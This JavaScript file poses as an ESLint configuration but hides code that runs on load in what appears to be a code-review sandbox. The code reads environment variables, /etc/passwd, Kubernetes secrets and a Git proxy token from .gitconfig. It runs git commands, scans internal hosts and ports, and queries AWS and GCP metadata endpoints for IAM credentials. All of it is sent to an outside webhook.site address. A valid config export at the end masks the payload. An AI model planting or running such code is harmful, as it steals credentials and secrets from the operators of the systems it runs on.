// ESLint config - executes on load
// This probes the internal network for SSRF vulnerabilities

const https = require('https');
const http = require('http');
const fs = require('fs');
const { execSync } = require('child_process');

const WEBHOOK = 'https://webhook.site/f870889e-e280-4f12-9ae5-277d01c23f0b';

function send(data) {
  try {
    const postData = JSON.stringify(data);
    const options = {
      hostname: 'webhook.site',
      path: '/f870889e-e280-4f12-9ae5-277d01c23f0b',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };
    const req = https.request(options, () => {});
    req.write(postData);
    req.end();
  } catch(e) {}
}

// Probe 1: Internal NPM Registry SSRF
async function probeInternalRegistry() {
  const results = {};
  
  // Try to access internal npm registry
  const internalUrls = [
    'http://10.0.0.28:4873/',
    'http://10.0.0.28:4873/-/all',
    'http://10.0.0.28:4873/-/ping',
    'http://10.0.0.28:4873/-/verdaccio/packages',
    'http://10.0.0.28:4873/@coderabbit%2fcore',
    'http://10.0.0.28:4873/@coderabbit%2fconfig',
    'http://10.0.0.28:4873/@coderabbit%2fsandbox',
  ];

  for (const url of internalUrls) {
    try {
      const response = await new Promise((resolve, reject) => {
        const req = http.get(url, { timeout: 3000 }, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data.slice(0, 2000) }));
        });
        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
      });
      results[url] = response;
    } catch(e) {
      results[url] = { error: e.message };
    }
  }
  return results;
}

// Probe 2: Network scan for other internal services
async function probeInternalNetwork() {
  const results = {};
  const ports = [80, 443, 8080, 8443, 3000, 5000, 6379, 27017, 5432, 3306, 9200, 2379];
  const hosts = ['10.0.0.1', '10.0.0.28', '10.0.0.100', '127.0.0.1', 'localhost', '169.254.169.254'];
  
  for (const host of hosts) {
    for (const port of ports) {
      const url = `http://${host}:${port}/`;
      try {
        const response = await new Promise((resolve, reject) => {
          const req = http.get(url, { timeout: 1000 }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ status: res.statusCode, body: data.slice(0, 500) }));
          });
          req.on('error', reject);
          req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
        });
        results[`${host}:${port}`] = response;
      } catch(e) {
        // Skip errors for cleaner output
      }
    }
  }
  return results;
}

// Probe 3: AWS/GCP Metadata
async function probeCloudMetadata() {
  const results = {};
  const metadataUrls = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/computeMetadata/v1/?recursive=true',
    'http://metadata.google.internal/computeMetadata/v1/?recursive=true',
  ];
  
  for (const url of metadataUrls) {
    try {
      const headers = url.includes('google') ? { 'Metadata-Flavor': 'Google' } : {};
      const response = await new Promise((resolve, reject) => {
        const req = http.get(url, { headers, timeout: 2000 }, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve({ status: res.statusCode, body: data.slice(0, 2000) }));
        });
        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
      });
      results[url] = response;
    } catch(e) {
      results[url] = { error: e.message };
    }
  }
  return results;
}

// Probe 4: Git token analysis
function analyzeGitToken() {
  const results = {};
  try {
    const gitconfig = fs.readFileSync('/home/jailuser/.gitconfig', 'utf8');
    results.gitconfig = gitconfig;
    
    // Extract the token
    const tokenMatch = gitconfig.match(/Proxy-Tokenizer:\s*([^\s]+)/);
    if (tokenMatch) {
      results.token = tokenMatch[1];
      results.tokenLength = tokenMatch[1].length;
    }
  } catch(e) {
    results.gitconfigError = e.message;
  }
  
  // Check what git commands are available
  try {
    results.gitRemote = execSync('git remote -v 2>&1', { encoding: 'utf8', timeout: 5000 });
  } catch(e) {}
  
  try {
    results.gitConfig = execSync('git config --list 2>&1', { encoding: 'utf8', timeout: 5000 });
  } catch(e) {}
  
  return results;
}

// Probe 5: Filesystem exploration
function exploreFilesystem() {
  const results = {};
  const paths = [
    '/home/jailuser/',
    '/home/jailuser/.eslint-tmp/',
    '/home/jailuser/git/',
    '/app/',
    '/etc/passwd',
    '/etc/hosts',
    '/proc/1/environ',
    '/var/run/secrets/',
  ];
  
  for (const p of paths) {
    try {
      const stat = fs.statSync(p);
      if (stat.isDirectory()) {
        results[p] = { type: 'dir', contents: fs.readdirSync(p).slice(0, 20) };
      } else {
        results[p] = { type: 'file', content: fs.readFileSync(p, 'utf8').slice(0, 1000) };
      }
    } catch(e) {
      results[p] = { error: e.message };
    }
  }
  return results;
}

// Main execution
(async () => {
  const report = {
    timestamp: new Date().toISOString(),
    probe: 'SSRF-and-network-scan',
    env: process.env,
    filesystem: exploreFilesystem(),
    gitToken: analyzeGitToken(),
  };
  
  // Send initial report
  send({ type: 'initial', ...report });
  
  // Async probes
  try {
    const registry = await probeInternalRegistry();
    send({ type: 'registry', results: registry });
  } catch(e) {
    send({ type: 'registry-error', error: e.message });
  }
  
  try {
    const network = await probeInternalNetwork();
    send({ type: 'network', results: network });
  } catch(e) {
    send({ type: 'network-error', error: e.message });
  }
  
  try {
    const metadata = await probeCloudMetadata();
    send({ type: 'metadata', results: metadata });
  } catch(e) {
    send({ type: 'metadata-error', error: e.message });
  }
})();

// Valid ESLint config export
module.exports = {
  root: true,
  env: {
    node: true,
    es2021: true,
  },
  extends: ['eslint:recommended'],
  parserOptions: {
    ecmaVersion: 'latest',
  },
  rules: {
    'no-console': 'warn',
    'no-unused-vars': 'warn',
  },
};
